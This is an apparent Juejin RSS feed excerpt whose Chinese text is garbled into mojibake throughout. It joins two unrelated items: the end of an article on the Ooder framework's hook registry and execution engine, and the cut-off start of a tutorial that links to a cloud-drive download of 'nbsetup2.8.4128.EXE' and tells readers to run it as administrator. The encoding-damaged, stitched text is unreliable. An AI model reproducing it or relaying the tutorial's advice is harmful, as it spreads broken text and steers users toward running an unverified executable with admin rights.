<h2 data-id="heading-1">äºŒã€åº•å±‚æ¶æ„è®¾è®¡ï¼šé’©å­æœºåˆ¶çš„"ä¸‰æ®µå¼"å®ç°é€»è¾‘</h2>
<p>Ooderæ¡†æ¶çš„é’©å­æœºåˆ¶åœ¨ä¿¡æ¯æ¶æ„ä¸­é‡‡ç”¨"å®šä¹‰-æ³¨å†Œ-æ‰§è¡Œ"çš„ä¸‰æ®µå¼è®¾è®¡ï¼Œå…¶æ ¸å¿ƒç»„ä»¶åŒ…æ‹¬é’©å­æ¥å£è§„èŒƒã€æ³¨å†Œä¸­å¿ƒä¸æ‰§è¡Œå¼•æ“ï¼Œä¸‰è€…ååŒç¡®ä¿ä¿¡æ¯äº¤äº’çš„æœ‰åºæ€§ä¸æ‰©å±•æ€§ã€‚</p>
<h3 data-id="heading-2">1. é’©å­æ¥å£è§„èŒƒï¼šä¿¡æ¯äº¤äº’çš„"å¥‘çº¦å®šä¹‰"</h3>
<p>æ‰€æœ‰é’©å­å‡éœ€éµå¾ªOoderé¢„è®¾çš„æ¥å£è§„èŒƒï¼Œè¯¥è§„èŒƒæ˜ç¡®äº†é’©å­çš„è¾“å…¥å‚æ•°ç»“æ„ï¼ˆåŸºäºæ¡†æ¶ä¿¡æ¯æ¨¡å‹çš„æ ‡å‡†åŒ–æ•°æ®å¯¹è±¡ï¼‰ã€è¿”å›å€¼ç±»å‹ï¼ˆä¸è§†å›¾ç»„ä»¶æˆ–ä¸šåŠ¡é€»è¾‘å¯¹åº”çš„æšä¸¾çº¦æŸï¼‰ä»¥åŠå¼‚å¸¸å¤„ç†æœºåˆ¶ã€‚ä¾‹å¦‚ï¼Œåœ¨è§†å›¾æ¸²æŸ“ç›¸å…³çš„é’©å­ä¸­ï¼Œæ¥å£ä¼šå¼ºåˆ¶çº¦æŸè¿”å›å€¼éœ€åŒ…å«<code>viewType</code>ä¸<code>renderData</code>å­—æ®µï¼Œä»¥ä¿è¯ä¸å‰ç«¯ç»„ä»¶çš„æ­£ç¡®æ˜ å°„ï¼ˆè¿™ä¸€ç‚¹åœ¨ã€ŠOoderé’©å­å®ç°é—®é¢˜è§£ç­”3ã€‹ä¸­å…³äº"è¿”å›ç±»å‹ä¸è§†å›¾ç»„ä»¶ç±»å‹æ˜ å°„"æœ‰è¯¦ç»†çº¦æŸè¯´æ˜ï¼‰ã€‚</p>
<h3 data-id="heading-3">2. æ³¨å†Œä¸­å¿ƒï¼šé’©å­ä¸é’©å­ç‚¹çš„"åŠ¨æ€ç»‘å®šä¸­æ¢"</h3>
<p>æ³¨å†Œä¸­å¿ƒé‡‡ç”¨"é”®å€¼å¯¹+ä¼˜å…ˆçº§"çš„å­˜å‚¨æ¨¡å‹ï¼Œå…¶ä¸­"é”®"ä¸ºé’©å­ç‚¹å”¯ä¸€æ ‡è¯†ï¼ˆå¦‚<code>beforeDataPersist</code>å¯¹åº”æ•°æ®æŒä¹…åŒ–å‰çš„é’©å­ç‚¹ï¼‰ï¼Œ"å€¼"ä¸ºè¯¥é’©å­ç‚¹ä¸‹å·²æ³¨å†Œçš„é’©å­å®ç°åˆ—è¡¨ï¼Œä¼˜å…ˆçº§åˆ™å†³å®šäº†å¤šä¸ªé’©å­çš„æ‰§è¡Œé¡ºåºã€‚è¿™ç§è®¾è®¡æ”¯æŒé’©å­çš„<strong>åŠ¨æ€å¢åˆ </strong>ä¸<strong>ä¼˜å…ˆçº§è°ƒæ•´</strong>ï¼Œä¾‹å¦‚åœ¨ç”µå•†åœºæ™¯ä¸­ï¼Œå¯ä¸´æ—¶æ³¨å†Œé«˜ä¼˜å…ˆçº§çš„ä¿ƒé”€æ´»åŠ¨é’©å­ï¼Œè¦†ç›–é»˜è®¤çš„ä»·æ ¼è®¡ç®—é€»è¾‘ã€‚</p>
<h3 data-id="heading-4">3. æ‰§è¡Œå¼•æ“ï¼šé’©å­é€»è¾‘çš„"è°ƒåº¦æ ¸å¿ƒ"</h3>
<p>æ‰§è¡Œå¼•æ“åµŒå…¥äºOoderæ¡†æ¶çš„ä¿¡æ¯å¤„ç†ä¸»æµç¨‹ä¸­ï¼Œå½“æµç¨‹åˆ°è¾¾é¢„è®¾é’©å­ç‚¹æ—¶ï¼Œå¼•æ“ä¼šä»æ³¨å†Œä¸­å¿ƒæ‹‰å–å¯¹åº”é’©å­åˆ—è¡¨ï¼ŒæŒ‰ç…§ä¼˜å…ˆçº§ä¾æ¬¡æ‰§è¡Œï¼Œå¹¶æ ¹æ®é’©å­è¿”å›å€¼å†³å®šåç»­æµç¨‹ï¼ˆå¦‚è¿”å›<code>ABORT</code>åˆ™ä¸­æ–­ä¸»æµç¨‹ï¼Œè¿”å›<code>MODIFIED_DATA</code>åˆ™ä½¿ç”¨é’©å­å¤„ç†åçš„æ•°æ®ç»§ç»­æ‰§è¡Œï¼‰ã€‚å¼•æ“è¿˜å…·å¤‡<strong>é’©å­éš”ç¦»èƒ½åŠ›</strong>ï¼Œå•ä¸ªé’©å­çš„å¼‚å¸¸ä¸ä¼šå½±å“å…¶ä»–é’©å­æˆ–ä¸»æµç¨‹çš„æ‰§è¡Œã€‚</p>
<h2 data-id="heading-5">ä¸‰ã€å®ç°ç»†èŠ‚æ·±åº¦è§£æï¼šä»ä»£ç é€»è¾‘åˆ°æ€§èƒ½ä¼˜åŒ–</h2>
<h3 data-id="heading-6">1. é’©å­ç‚¹çš„é¢„åŸ‹ç­–ç•¥</h3>
<p>Ooderæ¡†æ¶åœ¨ä¿¡æ¯æ¶æ„ä¸­é¢„åŸ‹é’©å­ç‚¹æ—¶ï¼Œéµå¾ª"æœ€å°ä¾µå…¥åŸåˆ™"ä¸"å…³é”®è·¯å¾„è¦†ç›–åŸåˆ™"ï¼š</p>
<ul>
<li>æœ€å°ä¾µå…¥ï¼šä»…åœ¨ä¿¡æ¯æµè½¬çš„å…³é”®èŠ‚ç‚¹ï¼ˆå¦‚æ•°æ®æ ¡éªŒã€æƒé™åˆ¤æ–­ã€æ ¼å¼è½¬æ¢ã€æŒä¹…åŒ–ã€è§†å›¾æ¸²æŸ“ï¼‰è®¾ç½®é’©å­ç‚¹ï¼Œé¿å…è¿‡åº¦æ‹†åˆ†å¯¼è‡´çš„æ€§èƒ½æŸè€—ï¼›</li>
<li>å…³é”®è·¯å¾„è¦†ç›–ï¼šç¡®ä¿æ ¸å¿ƒä¸šåŠ¡æµç¨‹ï¼ˆå¦‚ç”¨æˆ·è®¤è¯ã€è®¢å•å¤„ç†ã€æŠ¥è¡¨ç”Ÿæˆï¼‰çš„å…¨é“¾è·¯å‡æœ‰å¯æ‰©å±•çš„é’©å­ç‚¹ï¼Œä¾‹å¦‚è®¢å•åˆ›å»ºæµç¨‹ä¸­åŒ…å«<code>beforeCreate</code>ï¼ˆå‚æ•°æ ¡éªŒï¼‰ã€<code>onCreating</code>ï¼ˆåº“å­˜é”å®šï¼‰ã€<code>afterCreate</code>ï¼ˆæ¶ˆæ¯é€šçŸ¥ï¼‰ä¸‰ä¸ªé’©å­ç‚¹ï¼Œè¦†ç›–å®Œæ•´ç”Ÿå‘½å‘¨æœŸã€‚</li>
</ul>
<h3 data-id="heading-7">2. é’©å­ä¸è§†å›¾ç»„ä»¶çš„æ˜ å°„æœºåˆ¶</h3>
<p>åœ¨Ooderçš„ä¿¡æ¯æ¶æ„ä¸­ï¼Œé’©å­è¿”å›å€¼ä¸è§†å›¾ç»„ä»¶çš„æ˜ å°„æ˜¯å®ç°"åç«¯é©±åŠ¨å‰ç«¯æ¸²æŸ“"çš„æ ¸å¿ƒç¯èŠ‚ã€‚æ ¹æ®ã€ŠOoderé’©å­å®ç°é—®é¢˜è§£ç­”3ã€‹çš„æŠ€æœ¯è§„èŒƒï¼Œè¿™ç§æ˜ å°„é€šè¿‡ä¸¤å±‚æœºåˆ¶å®ç°ï¼š</p>
<ul>
<li>ç±»å‹æ˜ å°„ï¼šé’©å­è¿”å›çš„<code>viewType</code>å­—æ®µï¼ˆå¦‚<code>TABLE</code>ã€<code>FORM</code>ã€<code>CHART</code>ï¼‰ç›´æ¥å¯¹åº”å‰ç«¯ç»„ä»¶åº“ä¸­çš„åŸºç¡€ç»„ä»¶ç±»å‹ï¼›</li>
<li>é…ç½®æ˜ å°„ï¼šè¿”å›çš„<code>renderConfig</code>å­—æ®µåŒ…å«ç»„ä»¶çš„å±æ€§é…ç½®ï¼ˆå¦‚è¡¨æ ¼åˆ—å®šä¹‰ã€è¡¨å•æ ¡éªŒè§„åˆ™ï¼‰ï¼Œé€šè¿‡JSON Schemaä¸å‰ç«¯ç»„ä»¶çš„Propsè¿›è¡ŒåŠ¨æ€ç»‘å®šã€‚</li>
</ul>
<p>è¿™ç§è®¾è®¡ä½¿å¾—åç«¯å¯é€šè¿‡é’©å­åŠ¨æ€è°ƒæ•´å‰ç«¯è§†å›¾ï¼Œä¾‹å¦‚åœ¨æ•°æ®ç»Ÿè®¡åœºæ™¯ä¸­ï¼Œåˆ†æé’©å­å¯æ ¹æ®æ•°æ®ç»´åº¦è‡ªåŠ¨è¿”å›<code>CHART</code>ç±»å‹åŠå¯¹åº”çš„å›¾è¡¨é…ç½®ï¼Œæ— éœ€å‰ç«¯ç¡¬ç¼–ç ã€‚</p>
<h3 data-id="heading-8">3. æ€§èƒ½ä¼˜åŒ–ï¼šé’©å­æ‰§è¡Œçš„"è½»é‡çº§"ä¿éšœ</h3>
<p>ä¸ºé¿å…é’©å­æœºåˆ¶æˆä¸ºä¿¡æ¯å¤„ç†çš„æ€§èƒ½ç“¶é¢ˆï¼ŒOoderæ¡†æ¶é‡‡ç”¨äº†ä¸‰é¡¹ä¼˜åŒ–ç­–ç•¥ï¼š</p>
<ul>
<li>é’©å­æ‡’åŠ è½½ï¼šéæ ¸å¿ƒæµç¨‹çš„é’©å­å®ç°ä»…åœ¨é¦–æ¬¡è°ƒç”¨æ—¶åˆå§‹åŒ–ï¼Œå‡å°‘å¯åŠ¨æ—¶çš„èµ„æºæ¶ˆè€—ï¼›</li>
<li>å¼‚æ­¥æ‰§è¡Œæ± ï¼šå¯¹äºæ—¥å¿—è®°å½•ã€æ•°æ®åŒæ­¥ç­‰éé˜»å¡æ€§é’©å­ï¼Œæ‰§è¡Œå¼•æ“ä¼šå°†å…¶æ”¾å…¥å¼‚æ­¥çº¿ç¨‹æ± ï¼Œä¸é˜»å¡ä¸»æµç¨‹ï¼›</li>
<li>ç¼“å­˜å¤ç”¨ï¼šç›¸åŒé’©å­ç‚¹ã€ç›¸åŒè¾“å…¥å‚æ•°çš„é’©å­æ‰§è¡Œç»“æœä¼šè¢«çŸ­æš‚ç¼“å­˜ï¼ˆé»˜è®¤100msï¼‰ï¼Œé€‚ç”¨äºé«˜é¢‘è°ƒç”¨åœºæ™¯ï¼ˆå¦‚åˆ—è¡¨é¡µçš„æƒé™æ ¡éªŒé’©å­ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-9">å››ã€ä¼ä¸šçº§åº”ç”¨ï¼šä»æŠ€æœ¯åˆ°ä¸šåŠ¡çš„ä»·å€¼è½åœ°</h2>
<p>åœ¨ä¼ä¸šçº§A2UIï¼ˆè‡ªé€‚åº”ç”¨æˆ·ç•Œé¢ï¼‰ç­‰å…³é”®åœºæ™¯ä¸­ï¼ŒOoderçš„é’©å­æœºåˆ¶å±•ç°å‡ºå¼ºå¤§çš„ä¸šåŠ¡é€‚é…èƒ½åŠ›ã€‚ä»¥å¤§å‹ERPç³»ç»Ÿçš„å¤šç§Ÿæˆ·å®šåˆ¶ä¸ºä¾‹ï¼š</p>
<ul>
<li>ç§Ÿæˆ·çº§é’©å­æ³¨å†Œï¼šé€šè¿‡æ³¨å†Œä¸­å¿ƒä¸ºä¸åŒç§Ÿæˆ·ç»‘å®šä¸“å±é’©å­ï¼ˆå¦‚ç§Ÿæˆ·Açš„è®¢å•ç¼–å·ç”Ÿæˆè§„åˆ™é’©å­ï¼‰ï¼Œå®ç°"ä¸€å¥—æ ¸å¿ƒæ¶æ„ï¼Œå¤šå¥—ä¸šåŠ¡è§„åˆ™"ï¼›</li>
<li>è§†å›¾åŠ¨æ€é€‚é…ï¼šåŸºäºç§Ÿæˆ·è§„æ¨¡ï¼ˆå¦‚ä¼ä¸š/éƒ¨é—¨/ä¸ªäººï¼‰ï¼Œè§†å›¾é’©å­è¿”å›ä¸åŒå¤æ‚åº¦çš„ç»„ä»¶é…ç½®ï¼ˆå¦‚ä¼ä¸šç§Ÿæˆ·æ˜¾ç¤ºå®Œæ•´æŠ¥è¡¨ç»„ä»¶ï¼Œä¸ªäººç§Ÿæˆ·æ˜¾ç¤ºç®€åŒ–å¡ç‰‡ç»„ä»¶ï¼‰ï¼›</li>
<li>ç³»ç»Ÿé›†æˆæ‰©å±•ï¼šé€šè¿‡é’©å­å¯¹æ¥ç¬¬ä¸‰æ–¹ç³»ç»Ÿï¼ˆå¦‚å°†æ”¯ä»˜ç»“æœé€šçŸ¥é’©å­ä¸è´¢åŠ¡ç³»ç»ŸAPIç»‘å®šï¼‰ï¼Œé¿å…æ ¸å¿ƒä»£ç çš„é¢‘ç¹ä¿®æ”¹ã€‚</li>
</ul>
<p>æ­¤å¤–ï¼Œåœ¨ä¸šåŠ¡è¿­ä»£ä¸­ï¼Œé’©å­æœºåˆ¶æ”¯æŒ"çƒ­æ›´æ–°"èƒ½åŠ›â€”â€”å¼€å‘è€…å¯é€šè¿‡é…ç½®ä¸­å¿ƒåŠ¨æ€æ›´æ–°é’©å­å®ç°ï¼Œæ— éœ€é‡å¯æœåŠ¡å³å¯ç”Ÿæ•ˆï¼Œå¤§å¹…ç¼©çŸ­è¿­ä»£å‘¨æœŸã€‚</p>
<h2 data-id="heading-10">äº”ã€å®è·µè·¯å¾„ï¼šä»å…¥é—¨åˆ°ç²¾é€šçš„èƒ½åŠ›å»ºè®¾</h2>
<p>è¦æŒæ¡Ooderæ¡†æ¶ä¿¡æ¯æ¶æ„ä¸­çš„é’©å­æœºåˆ¶ï¼Œå»ºè®®éµå¾ª"ç†è®º-å®è·µ-æ·±åŒ–"çš„é€’è¿›è·¯å¾„ï¼š</p>
<ol>
<li><strong>åŸºç¡€è®¤çŸ¥</strong>ï¼šé€šè¿‡ã€ŠOoderé’©å­å®ç°è¯¦è§£.mdã€‹ç†è§£é’©å­ç‚¹åˆ†å¸ƒã€æ¥å£è§„èŒƒä¸æ³¨å†Œæ–¹å¼ï¼ŒæŒæ¡"Hello World"çº§é’©å­å¼€å‘ï¼ˆå¦‚åœ¨ç”¨æˆ·ç™»å½•åæ·»åŠ æ¬¢è¿æ¶ˆæ¯é’©å­ï¼‰ï¼›</li>
<li><strong>åœºæ™¯åº”ç”¨</strong>ï¼šç»“åˆã€ŠOoderé’©å­å®ç°é—®é¢˜è§£ç­”1-8.mdã€‹ä¸­çš„å…¸å‹æ¡ˆä¾‹ï¼ˆå¦‚æ•°æ®æƒé™æ§åˆ¶ã€è§†å›¾æ¡ä»¶æ¸²æŸ“ï¼‰ï¼Œåœ¨å®é™…é¡¹ç›®ä¸­å®ç°ä¸­ç­‰å¤æ‚åº¦çš„é’©å­é€»è¾‘ï¼›</li>
<li><strong>åŸç†æ·±åŒ–</strong>ï¼šç ”è¯»ã€ŠOoderé’©å­å®ç°ç»†èŠ‚åˆ†æ.mdã€‹ä¸ã€ŠOoderé’©å­å®ç°åˆ†ææŠ¥å‘Š.mdã€‹ï¼Œç†è§£æ³¨å†Œä¸­å¿ƒçš„åº•å±‚å­˜å‚¨ï¼ˆåŸºäºRedisçš„åˆ†å¸ƒå¼æ³¨å†Œï¼‰ä¸æ‰§è¡Œå¼•æ“çš„å¹¶å‘æ§åˆ¶é€»è¾‘ï¼›</li>
<li><strong>ä¼ä¸šçº§è¿›é˜¶</strong>ï¼šé€šè¿‡ã€ŠOoderé’©å­æŠ€æœ¯æ­ç§˜.mdã€‹æ¢ç´¢A2UIã€å¤šç§Ÿæˆ·éš”ç¦»ç­‰é«˜çº§åœºæ™¯ï¼Œè®¾è®¡æ”¯æŒé«˜å¹¶å‘ã€é«˜å¯ç”¨çš„é’©å­æ–¹æ¡ˆã€‚</li>
</ol>
<h2 data-id="heading-11">ç»“è¯­ï¼šé’©å­æœºåˆ¶â€”â€”ä¿¡æ¯æ¶æ„çš„"è¿›åŒ–åŸºå› "</h2>
<p>Ooderæ¡†æ¶ä¿¡æ¯æ¶æ„ä¸­çš„é’©å­æœºåˆ¶ï¼Œæœ¬è´¨æ˜¯é€šè¿‡"é¢„è®¾æ¥å£+åŠ¨æ€æ‰©å±•"çš„è®¾è®¡å“²å­¦ï¼Œèµ‹äºˆç³»ç»Ÿåœ¨ä¸æ”¹å˜æ ¸å¿ƒç»“æ„å‰æä¸‹çš„è‡ªæˆ‘è¿›åŒ–èƒ½åŠ›ã€‚ä»æŠ€æœ¯å±‚é¢çœ‹ï¼Œå®ƒè§£å†³äº†å¤§å‹ç³»ç»Ÿçš„æ¨¡å—åŒ–ä¸å¯æ‰©å±•æ€§éš¾é¢˜ï¼›ä»ä¸šåŠ¡å±‚é¢çœ‹ï¼Œå®ƒè®©æ¡†æ¶èƒ½å¤Ÿå¿«é€Ÿå“åº”å¤šå˜çš„ä¼ä¸šéœ€æ±‚ã€‚å¯¹äºå¼€å‘è€…è€Œè¨€ï¼Œæ·±å…¥ç†è§£é’©å­æœºåˆ¶ä¸ä»…æ˜¯æŒæ¡ä¸€é¡¹æŠ€æœ¯ï¼Œæ›´æ˜¯é¢†æ‚Ÿ"å¼€æ”¾-å°é—­åŸåˆ™"åœ¨æ¶æ„è®¾è®¡ä¸­çš„æè‡´å®è·µâ€”â€”è¿™æˆ–è®¸æ­£æ˜¯Ooderæ¡†æ¶åœ¨ä¼ä¸šçº§åº”ç”¨ä¸­ä¿æŒç”Ÿå‘½åŠ›çš„æ ¸å¿ƒå¯†ç ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[nbsetup2.8.4128ç®¡ç†å·¥å…·å®‰è£…æ•™ç¨‹åŠå·¥å…·è¯¦è§£]]></title>    <link>https://juejin.cn/post/7590104561474666548</link>    <guid>https://juejin.cn/post/7590104561474666548</guid>    <pubDate>2026-01-02T01:16:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590104561474666548" data-draft-id="7590054976488898600" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="nbsetup2.8.4128ç®¡ç†å·¥å…·å®‰è£…æ•™ç¨‹åŠå·¥å…·è¯¦è§£"/> <meta itemprop="keywords" content="Windows"/> <meta itemprop="datePublished" content="2026-01-02T01:16:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·613541146016"/> <meta itemprop="url" content="https://juejin.cn/user/1602431422584832"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            nbsetup2.8.4128ç®¡ç†å·¥å…·å®‰è£…æ•™ç¨‹åŠå·¥å…·è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1602431422584832/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·613541146016
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T01:16:27.000Z" title="Fri Jan 02 2026 01:16:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€‹</p>
<p>è¿™æ˜¯ä¸ª<strong>è½»é‡çº§è½¯ä»¶å®‰è£…/ç®¡ç†å·¥å…·</strong>ï¼Œä¸»è¦ç”¨æ¥è§£å†³â€œè£…è½¯ä»¶æ€»é‡åˆ°æ†ç»‘ã€æƒé™éº»çƒ¦â€çš„é—®é¢˜ï¼Œé€‚åˆæ™®é€šç”¨æˆ·å’Œå¼€å‘è€…å‡‘åˆç”¨ã€‚</p>
<p><strong>1. å…ˆæ‰¾å¯¹æ–‡ä»¶</strong>â€‹</p>
<p><strong>å®‰è£…åŒ…ä¸‹è½½ï¼š</strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fpan.quark.cn%2Fs%2F6746be8009a9" title="https://pan.quark.cn/s/6746be8009a9" target="_blank" ref="nofollow noopener noreferrer">pan.quark.cn/s/6746be800â€¦</a>ï¼Œä¸‹è½½å®Œå®‰è£…åŒ…åï¼Œå…ˆç¡®è®¤æ–‡ä»¶åæ˜¯Â <code>nbsetup2.8.4128.EXE</code>ï¼ˆåˆ«ä¸‹é”™ç‰ˆæœ¬ï¼ï¼‰ã€‚å¦‚æœæ˜¯å‹ç¼©åŒ…ï¼Œå…ˆè§£å‹åˆ°æ–‡ä»¶å¤¹é‡Œï¼Œæ‰¾åˆ°è¿™ä¸ªexeæ–‡ä»¶ã€‚</p>
<hr/>
<h4 data-id="heading-0"><strong>2. å³é”®â€œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œâ€</strong> â€‹</h4>
<p>åŒå‡»æ‰“å¼€å¯èƒ½ä¼šæç¤ºæƒé™ä¸å¤Ÿï¼Œä¿é™©èµ·è§ï¼Œ<strong>å³é”®ç‚¹å‡»æ–‡ä»¶â†’é€‰â€œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œâ€</strong> ï¼ˆå°¤å…¶Win10/11ç³»ç»Ÿï¼Œè¿™ä¸€æ­¥èƒ½é¿å…å¾ˆå¤šæŠ¥é”™ï¼‰ã€‚</p>
<hr/>
<h4 data-id="heading-1"><strong>3. è·Ÿç€å‘å¯¼ç‚¹â€œä¸‹ä¸€æ­¥â€</strong> â€‹</h4>
<p>æ‰“å¼€å®‰è£…ç¨‹åºåï¼ŒåŸºæœ¬å°±æ˜¯â€œä¸‹ä¸€æ­¥å¤§æ³•â€ï¼š</p>
<ul>
<li>ç¬¬ä¸€æ­¥å¯èƒ½è®©ä½ é€‰è¯­è¨€ï¼ˆé»˜è®¤ä¸­æ–‡å°±ç›´æ¥ä¸‹ä¸€æ­¥ï¼‰ï¼›</li>
<li>ç¬¬äºŒæ­¥çœ‹ç”¨æˆ·åè®®ï¼Œ<strong>å‹¾ä¸Šâ€œæˆ‘æ¥å—æ¡æ¬¾â€</strong> ï¼ˆä¸å‹¾ä¸è®©ç»§ç»­ï¼‰ï¼›</li>
<li>ç¬¬ä¸‰æ­¥é€‰å®‰è£…è·¯å¾„ï¼ˆå»ºè®®åˆ«æ”¾Cç›˜ï¼Œæ¯”å¦‚Dç›˜æ–°å»ºä¸ªâ€œnbè½¯ä»¶â€æ–‡ä»¶å¤¹ï¼Œçœå¾—å ç³»ç»Ÿç›˜ç©ºé—´ï¼‰ï¼›</li>
<li>ç¬¬å››æ­¥å¯èƒ½æœ‰é™„åŠ é€‰é¡¹ï¼ˆæ¯”å¦‚â€œåˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼â€ï¼Œéœ€è¦çš„å‹¾ä¸Šï¼Œä¸éœ€è¦çš„å–æ¶ˆï¼‰ï¼›</li>
<li>æœ€åç‚¹â€œå®‰è£…â€ï¼Œç­‰è¿›åº¦æ¡è·‘å®Œå°±è¡Œï¼ˆå¤§æ¦‚1-2åˆ†é’Ÿï¼Œçœ‹ç”µè„‘é€Ÿåº¦ï¼‰ã€‚</li>
</ul>
<hr/>
<h4 data-id="heading-2"><strong>4. å®Œæˆå®‰è£…ï¼Œæ£€æŸ¥æ˜¯å¦æˆåŠŸ</strong>â€‹</h4>
